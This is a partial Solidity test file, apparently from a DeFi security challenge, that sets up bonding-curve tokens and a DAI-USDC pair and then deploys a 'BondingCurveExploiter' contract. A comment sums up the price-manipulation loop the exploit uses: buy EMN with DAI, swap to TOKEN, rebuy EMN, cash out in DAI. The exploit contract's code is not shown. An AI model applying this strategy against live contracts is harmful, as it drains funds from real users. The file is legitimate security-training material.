...
import { BondingCurveExploiter } from "src/bonding-curve/BondingCurveExploiter.sol";
...
contract Testing is Test {
    ...
    function testChallengeExploit() public {
        ...
        // USDC, DAI, WETH
        // pair: DAI-USDC (0.5,0.5), 1 million liquidity each
        // amountAmin: 0, amountBmin: 0
        // depoloy bancor bonding curve
        // deploy eminence currency base, 999000 EMN as reserveRatio, 1 EMN = 1 DAI
        // deploy eminence currency, 500000 EMN as reserveRatio, 1 EMN = 1 TOKEN
        // add eminence currency as GM to eminence currency base
        // buy 200000 EMN from eminence currency base
        // buy 100000 EMN from eminence currency

        // adminUser has 97978565832599960079482136 EMN, 313014280511351330545272 TOKEN
        console.log('adminUser EMN balance',eminenceCurrencyBase.balanceOf(adminUser));
        console.log('adminUser TOKEN balance',eminenceCurrency.balanceOf(adminUser));

        // I buy a lot of EMN with DAI, with EMN, I buy TOKEN, which doesn't change the ration with EMN, which I use to rebuy EMN and then exchange per DAI
        new BondingCurveExploiter(address(eminenceCurrencyBase),address(eminenceCurrency),address(uniPair));
        vm.stopPrank();
        validation();
    }
